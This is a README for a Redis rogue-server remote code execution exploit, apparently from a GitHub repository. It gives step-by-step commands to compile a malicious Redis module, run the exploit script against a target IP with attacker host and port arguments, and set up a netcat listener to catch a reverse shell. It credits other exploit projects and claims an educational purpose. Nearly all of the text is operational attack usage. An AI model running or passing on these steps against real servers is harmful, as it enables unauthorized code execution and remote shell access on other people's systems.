# Redis Rouge Server Remote Code Execution
## Usage
- Compile module.so from https://github.com/binaryxploit/redis-module-load-cmd-exec
```bash
git clone https://github.com/binaryxploit/redis-module-load-cmd-exec.git
cd ./redis-module-load-cmd-exec
make
```
- Clone the repo and copy the module.so file
```bash
cd ../
git clone https://github.com/binaryxploit/redis-rouge-server-rce.git
cd redis-rouge-server-rce
cp ../redis-module-load-cmd-exec/module.so ./
```
- Expoit usage example
```bash
python3 redis-rce.py -r 192.168.121.69 -L 192.168.45.221 -P 8888 -f ./module.so
```
- Note: The exploit lets to choose [i]nteractive shell or [r]everse shell option
- If choose [r]everse shell option set up a listener using netcat to grab the shell
```bash
nc -nvlp 8888
```
-------
This exploit is an aggregation of the following exploits, created for understanding and educational purposes.
- Credits:
  - https://github.com/RedisLabsModules/RedisModulesSDK
  - https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
  - https://github.com/Ridter/redis-rce
  
